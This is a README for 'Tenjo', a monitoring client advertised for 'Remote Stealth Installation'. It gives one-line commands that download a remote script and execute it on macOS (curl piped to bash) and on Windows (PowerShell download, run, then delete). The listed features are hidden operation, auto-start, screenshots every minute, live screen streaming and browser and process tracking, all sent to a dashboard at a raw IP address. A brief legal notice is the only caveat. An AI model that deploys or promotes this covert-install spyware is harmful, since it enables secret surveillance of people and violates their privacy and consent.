# Tenjo Monitoring Client - Installation Instructions

## 🔒 Remote Stealth Installation

Use these one-line commands to install the Tenjo monitoring client remotely:

### macOS Installation (One-Line Remote)
```bash
curl -sSL https://raw.githubusercontent.com/Adi-Sumardi/Tenjo/master/client/remote_install_macos.sh | bash
```

### Windows Installation (One-Line Remote)
```cmd
powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Adi-Sumardi/Tenjo/master/client/remote_install_windows.bat' -OutFile '%TEMP%\install.bat' -UseBasicParsing; cmd /c '%TEMP%\install.bat'; del '%TEMP%\install.bat'"
```

## ⚙️ Configuration

The installer automatically downloads all source files from GitHub and configures:
- Server URL (can be production or local development)
- API key for authentication
- All required dependencies

## 🚀 Features

- **Stealth Mode**: Hidden installation and operation
- **Auto-Start**: Automatically starts on system boot
- **Screen Monitoring**: Captures screenshots every 60 seconds
- **Live Streaming**: Real-time screen streaming capability
- **Process Monitoring**: Tracks running applications
- **Browser Monitoring**: Monitors web browsing activity

## 📱 Remote Management

Access the dashboard at: `http://103.129.149.67`

View live streaming at: `http://103.129.149.67/client/{client-id}/live`

## 🗑️ Uninstallation

### macOS (One-Line Remote)
```bash
curl -sSL https://raw.githubusercontent.com/Adi-Sumardi/Tenjo/master/client/remote_uninstall_macos.sh | bash
```

### Windows (One-Line Remote)
```cmd
powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Adi-Sumardi/Tenjo/master/client/remote_uninstall_windows.bat' -OutFile '%TEMP%\uninstall.bat' -UseBasicParsing; cmd /c '%TEMP%\uninstall.bat'; del '%TEMP%\uninstall.bat'"
```

## 📋 Package Contents

This package contains:
- `main.py` - Main application entry point
- `requirements.txt` - Python dependencies
- `src/` - Source code modules
- This installation guide

**Note**: For remote installation, you don't need this package. Just use the one-line commands above.

## ⚠️ Legal Notice

This software is intended for legitimate monitoring purposes only. Ensure you have proper authorization before installing on any system.
